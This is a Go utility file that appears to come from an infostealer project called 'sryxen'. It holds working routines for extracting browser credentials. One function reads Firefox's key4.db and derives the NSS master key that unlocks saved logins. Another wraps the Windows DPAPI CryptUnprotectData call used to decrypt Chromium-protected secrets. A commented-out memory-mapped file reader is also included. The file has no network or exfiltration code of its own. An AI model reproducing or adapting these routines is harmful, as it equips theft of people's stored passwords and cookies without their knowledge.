package utils

import (
	"bytes"
	"database/sql"
	"errors"
	"fmt"
	"syscall"
	"sryxen/crypto"
	"unsafe"
)

var (
	kernel32dll            = syscall.NewLazyDLL("Kernel32.dll")
	crypt32dll             = syscall.NewLazyDLL("crypt32.dll")
	procGetFileSize        = kernel32dll.NewProc("GetFileSizeEx")
	procCryptUnprotectData = crypt32dll.NewProc("CryptUnprotectData")
	procLocalFree          = kernel32dll.NewProc("LocalFree")
)

type DataBlob struct {
	cbData uint32
	pbData *byte
}

type CryptProtectPromptStruct struct {
	Size        uint32
	PromptFlags uint32
	App         HWND
	Prompt      *uint16
}

type Handle uintptr
type HWND uintptr

const InvalidHandle = ^Handle(0)


func GetGeckoMasterKey(path string) (masterKey []byte, err error) {
	keyDb, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&immutable=1", path))
	if err != nil {
		return
	}

	var globalSalt, metaBytes, nssA11, nssA102, key []byte

	err = keyDb.QueryRow("SELECT item1, item2 FROM metaData WHERE id = 'password'").Scan(&globalSalt, &metaBytes)
	if err != nil {
		return
	}
	err = keyDb.QueryRow("SELECT a11, a102 FROM nssPrivate").Scan(&nssA11, &nssA102)
	if err != nil {
		return
	}

	metaPBE, err := crypto.NewASN1PBE(metaBytes)
	if err != nil {
		return
	}

	k, err := metaPBE.Decrypt(globalSalt, key)
	if err != nil {
		return
	}

	if !bytes.Contains(k, []byte("password-check")) {
		return nil, errors.New("invalid password")
	}

	if !bytes.Equal(nssA102, []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}) {
		return nil, errors.New("invalid A102")
	}

	nssPBE, err := crypto.NewASN1PBE(nssA11)
	if err != nil {
		return
	}

	mkey, err := nssPBE.Decrypt(globalSalt, key)
	if err != nil {
		return
	}

	return mkey[:24], nil
}

func CryptUnprotectData(data []byte) (decrypted []byte, err error) {
	dataIn := DataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
	var dataOut DataBlob
	r, _, err := procCryptUnprotectData.Call(uintptr(unsafe.Pointer(&dataIn)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&dataOut)))
	if r == 0 {
		return
	}
	defer LocalFree(uintptr(unsafe.Pointer(dataOut.pbData)))
	plaintext := unsafe.Slice(dataOut.pbData, dataOut.cbData)
	return plaintext, nil
}

func LocalFree(hmem uintptr) (err error) {
	r, _, er1 := procLocalFree.Call(hmem)
	if r == 0 {
		err = er1
	}
	return
}

func GetFileSize(handle Handle) (filesize uint32, err error) {
	var lpFileSize uint64
	r0, _, e1 := syscall.SyscallN(procGetFileSize.Addr(), 2, uintptr(handle), uintptr(unsafe.Pointer(&lpFileSize)))
	if handle == InvalidHandle {
		err = e1
		return
	}
	return uint32(r0), nil
}

/*
func ReadFile(path string) (content string, err error) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	hFile, err := windows.CreateFile(pathPtr, windows.GENERIC_READ, windows.FILE_SHARE_READ, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(hFile)

	dwFileSize, err := GetFileSize(hFile)
	if err != nil {
		return
	}
	fmt.Println("filesize: ", dwFileSize)

	mapHandle, err := windows.CreateFileMapping(hFile, nil, syscall.PAGE_READONLY, 0, 0, nil)
	if err != nil {
		return
	}
	defer windows.CloseHandle(mapHandle)

	mapAddress, err := windows.MapViewOfFile(mapHandle, syscall.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		return
	}
	defer windows.UnmapViewOfFile(mapAddress)

	data := make([]byte, dwFileSize)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(mapAddress))[:dwFileSize:dwFileSize])

	return string(data), nil
}
*/
